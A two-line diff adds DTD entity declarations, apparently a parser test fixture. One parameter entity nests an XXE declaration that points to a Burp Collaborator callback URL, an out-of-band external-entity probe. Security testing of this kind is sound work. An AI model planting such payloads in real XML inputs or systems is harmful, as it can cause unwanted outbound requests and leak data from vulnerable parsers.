@@ -1,0 +1,2 @@
+<!ENTITY blah "blah">
+<!ENTITY % notxxe '<!ENTITY % xxe "http://ehz4fagr35hczkizxi25yb0iu901oq.burpcollaborator.net/%nope;">'>
